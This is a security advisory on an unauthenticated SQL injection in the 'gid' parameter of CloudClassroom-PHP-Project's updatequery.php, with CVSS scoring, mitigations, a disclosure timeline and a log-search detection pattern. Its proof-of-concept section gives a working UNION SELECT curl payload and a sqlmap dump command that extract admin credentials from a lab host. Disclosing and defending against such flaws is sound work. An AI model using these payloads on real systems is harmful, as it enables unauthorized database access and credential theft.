# Security Advisory — SQL Injection in updatequery.php (parameter gid)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-08**
> **Publication Date:** 02/08/2026
> **Last Updated:** 02/08/2026
> **Severity:** Critical
> **CVSS:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
> **CWE:** CWE-89: SQL Injection
> **Status:** Unpatched

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **updatequery.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require professor session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `gid` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

Successful exploitation may result in **Arbitrary database read (C:H) — PII, plaintext passwords, admin credentials; write via UPDATE/POST sink (I:H); total chain compromise.**

Disclosure follows responsible/coordinated policy; formal vendor notification is planned in the disclosure package (see sections 13 and 14). As of now no patch is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: updatequery.php | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other version/product evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **updatequery.php**.

Parameter `gid` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

**Root cause (source code snippet):**

**`updatequery.php`**

```php
$x=$_GET['gid'];
$sql="select * from <table> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);
```

### Necessary Conditions

- Authentication: None (via Broken Access Control — item 00; design would require professor session)
- User Interaction: None
- Attack Vector: Remote (network) — method GET (+POST on UPDATE)
- Preconditions: None on target (item 00). With original session requirement, PR rises and score drops.

---

## 4. Impact

Exploitation may allow:

- Arbitrary database read (C:H) — PII, plaintext passwords, admin credentials
- write via UPDATE/POST sink (I:H)
- total chain compromise

### Impact on Confidentiality

High — an attacker can read sensitive system data (PII, credentials, business data).

### Impact on Integrity

High — data, configuration or records can be created, altered or removed arbitrarily.

### Impact on Availability

None — no direct availability impact.

---

## 5. Classification

### CVSS

- **Score:** 9.1
- **Severity:** Critical
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

### CWE

- CWE-89: SQL Injection

### CAPEC

- **CAPEC-66 – SQL Injection**

---

## 6. Exploitation Scenario

A possible exploitation scenario occurs as follows:

1. Request `updatequery.php` with `gid` containing UNION payload (no cookie — item 00).
2. Adjust column count to 4 (target table) and position data in displayed column.
3. Read admin credentials reflected in response.
4. Automate with sqlmap (`-p gid`) for full database dump.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): updatequery.php
Parameter(s): gid
Method: GET (+POST on UPDATE) · Authentication: None (via Broken Access Control — item 00; design would require professor session)
```

### Example Request

```http
POST /updatequery.php HTTP/1.1
Host: 192.168.95.131:9292
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>

gid=<value>
```

### Observed Response

```text
[admin@ics.com:admin]
```

### Result

Reproduced live in authorized lab (http://192.168.95.131:9292/) on 02/08/2026, in a non-destructive manner. Observed behavior confirms the SQL Injection (UNION-based / error-based) flaw.

**a) Execution in browser** (real server response rendered, with evidence band):

<img width="1180" height="1042" alt="evidencia-web-08-updatequery-sqli" src="https://github.com/user-attachments/assets/df264b2d-de48-45c0-a71b-3bf14fcf3723" />

**b) Vulnerable code line** (`updatequery.php`):

<img width="2360" height="800" alt="evidencia-codigo-08-updatequery-sqli" src="https://github.com/user-attachments/assets/9e82a390-6e8c-4d8d-9712-42c6ec74ead4" />

---

## 8. Proof of Concept

The PoC below demonstrates only vulnerable behavior and should be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s -G "http://192.168.95.131:9292/updatequery.php" \
  --data-urlencode "gid=0 UNION SELECT concat(0x5b,Aid,0x3a,Apass,0x5d),2,3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/updatequery.php?gid=1" -p gid --batch --dump -T admin
```

### Expected Result

```text
[admin@ics.com:admin]
[vishu:vishu]
```


### PoC Limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data (state injections are restored; error-based aborts before persisting).
- Does not create persistence or backdoor.
- Does not contain real credentials (lab test data only).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure the prerequisite: None on target (item 00). With original session requirement, PR rises and score drops.
3. Access the component **updatequery.php** (parameter(s): gid).
4. Send the request/input described in sections 7 and 8.
5. Observe the vulnerable result: [admin@ics.com:admin]
6. Compare with expected safe behavior (properly validated/sanitized/authorized input, without payload reflection or unintended execution).

---

## 10. Mitigation

Until the definitive fix is applied, recommended:

- Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries.
- Enforce type casting for numeric identifiers (`(int)$id`) and use allowlist where applicable.
- Do not echo `$sql`/`mysqli_error()` to client (remove error oracle).
- Apply `exit;` after session guard (see item 00).

Additional compensatory measures:

- Restrict access to affected component (network/ACL/WAF).
- Apply WAF/reverse proxy rules to block known attack patterns.
- Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
- Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this advisory date (unpatched product).**

When made available, recommended:

1. Update to patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to update.
5. Confirm vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries.
- Enforce type casting for numeric identifiers (`(int)$id`) and use allowlist where applicable.
- Do not echo `$sql`/`mysqli_error()` to client (remove error oracle).
- Apply `exit;` after session guard (see item 00).

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Requests to `updatequery.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `gid`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "updatequery.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 02/08/2026 | Vulnerability identified (static analysis) |
| 02/08/2026 | Confirmed dynamically in authorized lab |
| 02/08/2026 | Re-validated live with evidence (browser + code) |
| 02/08/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Fix made available |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

- **Vendor:** Vishal Mathur (`mathurvishal`)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email (see `VENDOR-EMAIL.md`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor positioning:** N/A at this time

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 02/08/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive and security improvement purposes.

Information presented was obtained in authorized environment and disclosed responsibly or coordinately. The author does not encourage use of this information for unauthorized access, service interruption, privacy violation or any illegal activity.

Use of information in this document is solely the reader's responsibility.

---

## 19. Contact

For corrections, updates or additional information:

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
